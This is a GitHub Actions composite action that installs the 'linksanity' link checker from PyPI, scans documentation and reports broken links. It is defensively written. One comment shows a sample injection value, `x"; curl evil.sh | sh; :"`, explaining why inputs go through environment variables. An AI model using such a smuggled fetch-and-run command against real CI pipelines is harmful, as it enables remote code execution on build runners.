name: linksanity
description: Scan documentation for broken links with linksanity and fail the job if any are found.
author: ya8282

inputs:
  paths:
    description: Space-separated paths to scan for links.
    required: false
    default: "."
  version:
    description: Version of linksanity to install from PyPI. Empty string installs the latest release.
    required: false
    default: ""
  python-version:
    description: Python version to set up for running linksanity.
    required: false
    default: "3.12"
  check-anchors:
    description: Whether to check in-page anchor links ("true"/"false").
    required: false
    default: "false"
  skip-urls:
    description: Space-separated URL patterns to skip.
    required: false
    default: ""
  output:
    description: Path to write the JSON scan results to.
    required: false
    default: "linkcheck-results.json"
  args:
    description: Extra raw arguments passed through to `linksanity scan` as-is.
    required: false
    default: ""
  upload-results:
    description: Whether to upload the scan results file as a workflow artifact ("true"/"false").
    required: false
    default: "true"
  browser:
    description: Whether to install the Playwright browser extra, required for --js-domains ("true"/"false"). Adds a Chromium download to the run.
    required: false
    default: "false"

outputs:
  broken-count:
    description: Number of links with status "broken" or "error" found by the scan.
    value: ${{ steps.scan.outputs.broken-count }}
  results-file:
    description: Path to the JSON results file written by the scan.
    value: ${{ steps.scan.outputs.results-file }}

runs:
  using: composite
  steps:
    - name: Set up Python
      uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6.2.0
      with:
        python-version: ${{ inputs.python-version }}

    - name: Install linksanity
      shell: bash
      # Inputs go through env, never `${{ }}` interpolation into the script body:
      # a value like `x"; curl evil.sh | sh; :"` would otherwise execute.
      env:
        VERSION: ${{ inputs.version }}
        BROWSER: ${{ inputs.browser }}
      run: |
        if [ "$BROWSER" = "true" ]; then
          if [ -n "$VERSION" ]; then
            pip install "linksanity[browser]==$VERSION"
          else
            pip install "linksanity[browser]"
          fi
          playwright install --with-deps chromium
        else
          if [ -n "$VERSION" ]; then
            pip install "linksanity==$VERSION"
          else
            pip install "linksanity"
          fi
        fi

    - name: Run scan
      id: scan
      shell: bash
      env:
        PATHS: ${{ inputs.paths }}
        CHECK_ANCHORS: ${{ inputs.check-anchors }}
        SKIP_URLS: ${{ inputs.skip-urls }}
        OUTPUT: ${{ inputs.output }}
        EXTRA_ARGS: ${{ inputs.args }}
        BROWSER: ${{ inputs.browser }}
      run: |
        if [ "$BROWSER" != "true" ]; then
          case "$EXTRA_ARGS" in
            *--js-domains*)
              echo "::error::--js-domains requires Playwright. Set \`browser: true\` on this action to install it."
              exit 1
              ;;
          esac
        fi

        flags=""
        if [ "$CHECK_ANCHORS" = "true" ]; then
          flags="$flags --check-anchors"
        fi
        if [ -n "$SKIP_URLS" ]; then
          skip_file=$(mktemp)
          set -f
          printf '%s\n' $SKIP_URLS > "$skip_file"
          set +f
          flags="$flags --skip-urls $skip_file"
        fi

        set +e
        # $PATHS, $flags and $EXTRA_ARGS are deliberately unquoted: all three are
        # space-separated lists that must word-split into separate argv entries.
        linksanity scan $PATHS --format json --output "$OUTPUT" $flags $EXTRA_ARGS
        code=$?
        set -e

        # linksanity only writes the results file once it reaches the reporting
        # stage. Any early exit (unknown flag, unreadable config, missing
        # Playwright) leaves no file, so jq must not be allowed to fail here --
        # it would mask the real error and leave both outputs unset.
        broken_count=0
        if [ -f "$OUTPUT" ]; then
          broken_count=$(jq '[.[] | select(.status=="broken" or .status=="error")] | length' "$OUTPUT" 2>/dev/null || echo 0)
        else
          echo "::warning::linksanity exited $code without writing $OUTPUT; reporting broken-count=0. Check the scan step log above for the underlying error."
        fi

        echo "broken-count=$broken_count" >> "$GITHUB_OUTPUT"
        echo "results-file=$OUTPUT" >> "$GITHUB_OUTPUT"

        exit $code

    - name: Upload scan results
      if: always() && inputs.upload-results == 'true'
      uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
      with:
        name: linksanity-results
        path: ${{ inputs.output }}

branding:
  icon: link
  color: purple
